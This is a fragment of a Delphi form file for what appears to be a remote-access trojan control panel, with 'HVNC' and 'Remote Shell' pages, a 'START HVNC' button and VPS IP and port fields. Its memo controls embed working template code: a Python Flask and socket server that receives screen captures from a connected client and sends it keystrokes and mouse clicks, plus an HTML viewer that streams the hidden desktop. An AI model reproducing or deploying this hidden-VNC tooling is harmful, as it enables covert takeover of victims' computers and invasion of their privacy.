          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
      end
    end
    object HVNC: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = 14968160
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 5
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel7: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label9: TLabel
          Left = 41
          Top = 17
          Width = 28
          Height = 16
          Caption = 'HVNC'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object Label10: TLabel
          Left = 17
          Top = 238
          Width = 84
          Height = 15
          Caption = 'Client Waiting...'
        end
        object scGPImage8: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000002
            794944415478DA63640002333B5FC5538736DF6720033082343330319C62FCCF
            1876F2E0A6FD241B00224C1CFDAC99FEFFDFF8FFFFFFC4D307B76C26D9006443
            4478FFE6150731CB32B172C5FEFBF3531624C7CCC2F1F8CFAF6F8BFEFCFB39C7
            2365E73BAC068040438977C7FE4B4C65C9819A7FFC821259B9F865C0E2DF3E3E
            66787475E38F570F8FFFFDFFE74FAE6BEAB6F92806AC5A15CA2CF4E5D73C364E
            FE6026E948EEC6DE250CA60E810C4FBE0B821559EB48302478A8337C7F7F8BE1
            D2BE8EAFBF7F7C5CFD969B2D252C6CF55F469066E16F7F57F08BAAB9EBBBD6F2
            B2B0723134CFDAC1B063ED020643F7240671257D061F5D5686B3375E32A4786B
            32FCF9FD8DE1C2AE864F9FDFDCD971E8817E24E3BE8521737904E5228DBD3B39
            999858C03646B7EE619010E66138B6BA938157588AC12EBA9EE1E6D5CB0C8BAB
            9CC1F2FFFEFD6138BBA5FCFBD70F8F9632EE5F18BC98474829C8C8B3858B8999
            0D6240CB1E062D3D7D86834B1B193EBF79CA60E293C5F0EE1B23C3D26A178801
            7F7F319CDB5EFDF5F3BBFB6BE05EE01594F734706FE26665E76198BBED06C389
            5B1F1814159519DEBEB8CB7062DD0406179F7086C6DC4086DF3F3F339CDB51FB
            E5DB8747DBC05E400E44762E81105DC70A2E6E613586853B6E31EC3DFF046CA3
            8EE45F86839B173314A50732707FDCF4EDD78F8FABE081881C8DBBE678A53031
            B34C1097B76691D5F663E71556028B7F7E7B9761EF8E25BF262FBBCC6AA2FC7F
            72CFB42DF958D30108EC59E82CCCF88F2B8599852BFECFAFAF2013FEB3B071DF
            FFF3FBFB82499B192EBD78FF7F3130C526C1522C86018480A993BF15E3BF7F1B
            6186906C00089839F93A31FC635809C46664190036045A040000A59E0FA75846
            9AFB0000000049454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object Memo1: TMemo
          Left = 19
          Top = 47
          Width = 174
          Height = 174
          BorderStyle = bsNone
          Color = 3479824
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 14968160
          Font.Height = -13
          Font.Name = 'Consolas'
          Font.Pitch = fpVariable
          Font.Style = []
          Lines.Strings = (
            'from flask import request, Flask, make_response'
            'app = Flask(__name__)'
            'import requests, struct, threading'
            'from requests.structures import CaseInsensitiveDict'
            'import socket'
            'from io import BytesIO'
            ''
            '# Global connection variable'
            'conn = None'
            'conn_lock = threading.Lock()  # Add a lock for thread safety'
            ''
            '@app.route("/keydown/<key>", methods=['#39'GET'#39'])'
            'def kd(key):'
            '    global conn'
            '    if conn is None:'
            '        return "No client connected", 503'
            '    '
            
              '    conn.sendall(b"\x69"+struct.pack("<I", int(key))+b"\x00\x00\' +
              'x00\x00")'
            '    return "a"'
            ''
            '@app.route("/mouse/<x>/<y>", methods=['#39'GET'#39'])'
            'def click(x, y):'
            '    global conn'
            '    if conn is None:'
            '        return "No client connected", 503'
            '    '
            
              '    conn.sendall(b"\x71"+struct.pack("<I", int(x))+struct.pack("' +
              '<I", int(y)))'
            '    return "a"'
            ''
            '@app.route("/firstimage.png", methods=['#39'GET'#39'])'
            'def a2():'
            '    global conn'
            '    if conn is None:'
            '        return "No client connected", 503'
            '    '
            '    conn.sendall(b"\x67"*9)'
            
              '    sz = int.from_bytes(conn.recv(4, socket.MSG_WAITALL), "littl' +
              'e")'
            '    conn.recv(8, socket.MSG_WAITALL)'
            '    data = conn.recv(sz, socket.MSG_WAITALL)'
            '    response = make_response(data)'
            '    response.headers.set('#39'Content-Type'#39', '#39'image/png'#39')'
            '    return response'
            ''
            '@app.route("/image.png", methods=['#39'GET'#39'])'
            'def a():'
            '    global conn'
            '    if conn is None:'
            '        return "No client connected", 503'
            '    '
            '    try:'
            '        conn.sendall(b"\x68"*9)'
            
              '        sz = int.from_bytes(conn.recv(4, socket.MSG_WAITALL), "l' +
              'ittle")'
            
              '        x = int.from_bytes(conn.recv(4, socket.MSG_WAITALL), "li' +
              'ttle")'
            
              '        y = int.from_bytes(conn.recv(4, socket.MSG_WAITALL), "li' +
              'ttle")'
            '        data = conn.recv(sz, socket.MSG_WAITALL)'
            '    except (OSError, ConnectionResetError, socket.error) as e:'
            '        print(f"Recv failed: {e}")'
            '        with conn_lock:'
            '            if conn:'
            '                try:'
            '                    conn.close()'
            '                except:'
            '                    pass'
            '                conn = None'
            '        return "Client disconnected during image transfer", 503'
            ''
            '    response = make_response(data)'
            '    response.headers.set('#39'Content-Type'#39', '#39'image/png'#39')'
            '    response.headers.set('#39'X'#39', str(x))'
            '    response.headers.set('#39'Y'#39', str(y))'
            '    return response'
            ''
            '@app.route("/", methods=['#39'GET'#39'])'
            'def ma():'
            '    f=open("%demo%", "r")'
            '    r=f.read()'
            '    f.close()'
            '    return r'
            ''
            'def accept_connection():'
            '    global conn'
            '    '
            '    while True:'
            '        try:'
            '            HOST = "%MYIP%"'
            '            PORT = %SERVERPORT%'
            
              '            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM' +
              ')'
            
              '            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,' +
              ' 1)  # Allow reuse of address'
            '            s.bind((HOST, PORT))'
            '            s.listen()'
            
              '            print("Waiting for client connection on port 6968...' +
              '")'
            '            '
            '            new_conn, addr = s.accept()'
            '            print(f"Connection received from {addr}!")'
            '            '
            '            # Use lock when updating the global connection'
            '            with conn_lock:'
            '                conn = new_conn'
            '            '
            '            # Wait until connection is closed or an error occurs'
            '            while True:'
            
              '                # Simple non-blocking check if connection is sti' +
              'll alive'
            '                try:'
            '                    old_timeout = conn.gettimeout()'
            '                    conn.settimeout(0.1)  # Very short timeout'
            
              '                    # Peek at any available data without removin' +
              'g it from the buffer'
            '                    data = conn.recv(1, socket.MSG_PEEK)'
            
              '                    # If we received 0 bytes, the connection was' +
              ' closed'
            '                    if not data:'
            '                        print("Connection closed by client")'
            '                        break'
            '                    conn.settimeout(old_timeout)'
            '                except (socket.timeout, BlockingIOError):'
            '                    # No data available, connection still active'
            '                    conn.settimeout(old_timeout)'
            '                except Exception as e:'
            '                    print(f"Connection error: {e}")'
            '                    break'
            '                '
            '                # Check less frequently to reduce overhead'
            '                import time'
            '                time.sleep(5)'
            '            '
            '            # Connection was closed or had an error'
            '            with conn_lock:'
            '                if conn:'
            '                    try:'
            '                        conn.close()'
            '                    except:'
            '                        pass'
            '                    conn = None'
            '                    '
            '        except Exception as e:'
            '            print(f"Socket error: {e}")'
            '            with conn_lock:'
            '                if conn:'
            '                    try:'
            '                        conn.close()'
            '                    except:'
            '                        pass'
            '                    conn = None'
            '            '
            '            # If binding fails, wait before retrying'
            '            import time'
            '            time.sleep(1)'
            ''
            'if __name__ == "__main__":'
            '    # Start socket connection in a separate thread'
            
              '    connection_thread = threading.Thread(target=accept_connectio' +
              'n)'
            '    connection_thread.daemon = True'
            '    connection_thread.start()'
            '    '
            '    # Start the Flask server immediately'
            '    from waitress import serve'
            '    print("Starting web server on port 1337...")'
            '    serve(app, host="%MYIP%", port=%FLASKPORT%)')
          ParentFont = False
          TabOrder = 1
          WordWrap = False
        end
        object Memo2: TMemo
          Left = 216
          Top = 47
          Width = 177
          Height = 174
          BorderStyle = bsNone
          Color = 3479824
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 14968160
          Font.Height = -12
          Font.Name = 'Segoe UI'
          Font.Style = []
          Lines.Strings = (
            '<meta http-equiv="Cache-Control" content="no-store" />'
            '<canvas id="canvas" width=1920 height=1080></canvas>'
            '<script>'
            'const request = new XMLHttpRequest();'
            'var x=0;'
            'var y=0;'
            'function mov(event){'
            
              '    request.open("GET", "http://%MYIP%:%MYPORT%/mouse/"+event.cl' +
              'ientX+"/"+event.clientY, true);'
            '    request.send(null);'
            '}'
            'function kd(event){'
            
              '    request.open("GET", "http://%MYIP%:%MYPORT%/keydown/"+event.' +
              'keyCode, true);'
            '    request.send(null);'
            '}'
            'document.addEventListener("keydown", kd);'
            
              'document.getElementById("canvas").addEventListener("click", mov)' +
              ';'
            'var imageObj = new Image();'
            'imageObj.onload = function() {'
            '    drawOnCanvas();'
            '    setTimeout(timedRefresh, 100);'
            '}'
            'imageObj.onerror = function() {'
            '    setTimeout(timedRefresh, 100);'
            '}  '
            
              'imageObj.src = "http://%MYIP%:%MYPORT%/firstimage.png?dummy=" + ' +
              'Math.random();'
            'function _arrayBufferToBase64( buffer ) {'
            '    var binary = '#39#39';'
            '    var bytes = new Uint8Array(buffer);'
            '    var len = bytes.byteLength;'
            '    for (var i = 0; i < len; i++) {'
            '        binary += String.fromCharCode(bytes[i]);'
            '    }'
            '    return btoa(binary);'
            '}'
            ''
            'function timedRefresh() {'
            '    const req = new XMLHttpRequest();'
            
              '    req.open("GET", "http://%MYIP%:%MYPORT%/image.png?dummy=" + ' +
              'Math.random(), true)'
            '    req.responseType = "arraybuffer";'
            '    req.onload = (event) => {'
            '        x = parseInt(req.getResponseHeader("X"));'
            '        y = parseInt(req.getResponseHeader("Y"));'
            '        var b64encoded = _arrayBufferToBase64(req.response);'
            '        imageObj.src = '#39'data:image/png;base64,'#39' + b64encoded;'
            '    };'
            '    req.send(null);'
            '}'
            ''
            'function drawOnCanvas() {'
            '    var canvas = document.getElementById("canvas");'
            '    if(imageObj.naturalWidth>canvas.width){'
            '        canvas.width = imageObj.naturalWidth;'
            '        canvas.height = imageObj.naturalHeight;'
            '    }'
            '    var ctx = canvas.getContext("2d");'
            
              '    ctx.clearRect(x, y, imageObj.naturalWidth, imageObj.naturalH' +
              'eight);'
            
              '    ctx.drawImage(imageObj, x, y, imageObj.naturalWidth, imageOb' +
              'j.naturalHeight);'
            '}'
            ''
            '</script>')
          ParentFont = False
          TabOrder = 2
          WantReturns = False
          WordWrap = False
        end
        object scGPButton12: TscGPButton
          Left = 17
          Top = 259
          Width = 382
          Height = 33
          FluentUIOpaque = False
          TabOrder = 3
          OnClick = scGPButton12Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '                                             START HVNC'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = VirtualImageList1
          ImageIndex = 26
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object flaskport: TEdit
          Left = 75
          Top = 18
          Width = 66
          Height = 23
          TabOrder = 4
          Text = 'FlaskPort'
          Visible = False
        end
        object vpsip: TEdit
          Left = 147
          Top = 18
          Width = 106
          Height = 23
          TabOrder = 5
          Text = 'IP'
          Visible = False
        end
        object normalport: TEdit
          Left = 258
          Top = 18
          Width = 74
          Height = 23
          TabOrder = 6
          Text = 'NormalPort'
        end
        object FlaskHTMLEdit: TEdit
          Left = 259
          Top = 18
          Width = 118
          Height = 23
          TabOrder = 7
          Text = 'FlaskHTML'
          Visible = False
        end
      end
    end
    object RemoteShell: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 4
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel6: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label8: TLabel
          Left = 41
          Top = 17
          Width = 84
          Height = 16
          Caption = 'Remote Shell'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage7: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000000
            934944415478DA6364A01030AE3F7AE3FFC01B30B9B3852CCDB9E53583CD000E
            2E76067E411E86974FDF926780B8B43043709A33C3CE95C718EE5E7B429E1784
            C4F819C2B3DC18CE1FBDC17062F765320C10E56308CD7463B870F426C3C9BD24
            1A20262DC4109CEACCB077DD29865B971E92198842DC0C2F9FBC832BAA989488
            A2A9236F3E0DA3916C03C8D20D058C9468060100CB30702BEE6AC39A00000000
            49454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object shelledit: TscGPMemo
          Left = 19
          Top = 56
          Width = 382
          Height = 161
          FluentUIOpaque = False
          Options.NormalColor = 3479824
          Options.HotColor = 3479824
          Options.FocusedColor = 3479824
          Options.DisabledColor = 3479824
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 150
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 4599078
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = clWhite
          Options.FontHotColor = clWhite
          Options.FontFocusedColor = clWhite
          Options.FontDisabledColor = clWhite
          Options.ShapeFillGradientAngle = -90
          Options.ShapeFillGradientBeginColorOffset = 25
          Options.ShapeFillGradientEndColorOffset = 25
          Options.ShapeCornerRadius = 0
          Options.ScaleFrameWidth = False
          Options.StyleColors = True
          ScrollBarOptions.BorderWidth = 0
          ScrollBarOptions.FillColor = clBtnFace
          ScrollBarOptions.FillColorAlpha = 100
          ScrollBarOptions.ThumbColor = clWindowText
          ScrollBarOptions.ThumbColorAlpha = 50
          ScrollBarOptions.ThumbColorHotAlpha = 100
          ScrollBarOptions.ThumbColorPressedAlpha = 150
          ScrollBarOptions.ThumbRounded = False
          ScrollBarOptions.Position = scgpsbDefault
          ScrollBarOptions.ThumbChangeSizeEffect = False
          ScrollBarOptions.Size = 11
          Color = 2428680
          ContentMarginLeft = 5
          ContentMarginRight = 5
          ContentMarginTop = 5
          ContentMarginBottom = 5
          Font.Charset = DEFAULT_CHARSET
          Font.Color = clWhite
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          HidePromptTextIfFocused = False
          PromptTextColor = clWhite
          Lines.Strings = (
            'informationedit')
          ParentFont = False
          TabOrder = 1
          Transparent = False
        end
        object scGPButton15: TscGPButton
          Left = 19
          Top = 252
          Width = 382
          Height = 33
          FluentUIOpaque = False
          TabOrder = 2
          OnClick = scGPButton15Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '                                                    Send '
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = VirtualImageList1
          ImageIndex = 22
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object commandedit: TscEdit
          Left = 19
          Top = 223
          Width = 382
          Height = 24
          FluentUIOpaque = False
          UseFontColorToStyleColor = False
          ContentMarginLeft = 0
          ContentMarginRight = 0
          ContentMarginTop = 0
          ContentMarginBottom = 0
          CustomBackgroundImageNormalIndex = -1
          CustomBackgroundImageHotIndex = -1
          CustomBackgroundImageDisabledIndex = -1
          PromptTextColor = clNone
          HideMaskWithEmptyText = False
          HidePromptTextIfFocused = False
          WallpaperIndex = -1
          LeftButton.ComboButton = False
          LeftButton.Enabled = True
          LeftButton.Visible = False
          LeftButton.ShowHint = False
          LeftButton.ShowEllipses = False
          LeftButton.StyleKind = scbsPushButton
          LeftButton.Width = 18
          LeftButton.ImageIndex = -1
          LeftButton.ImageHotIndex = -1
          LeftButton.ImagePressedIndex = -1
          LeftButton.RepeatClick = False
          LeftButton.RepeatClickInterval = 200
          LeftButton.CustomImageNormalIndex = -1
          LeftButton.CustomImageHotIndex = -1
          LeftButton.CustomImagePressedIndex = -1
          LeftButton.CustomImageDisabledIndex = -1
          RightButton.ComboButton = False
          RightButton.Enabled = True
          RightButton.Visible = False
          RightButton.ShowHint = False
          RightButton.ShowEllipses = False
          RightButton.StyleKind = scbsPushButton
          RightButton.Width = 18
          RightButton.ImageIndex = -1
          RightButton.ImageHotIndex = -1
          RightButton.ImagePressedIndex = -1
          RightButton.RepeatClick = False
          RightButton.RepeatClickInterval = 200
          RightButton.CustomImageNormalIndex = -1
          RightButton.CustomImageHotIndex = -1
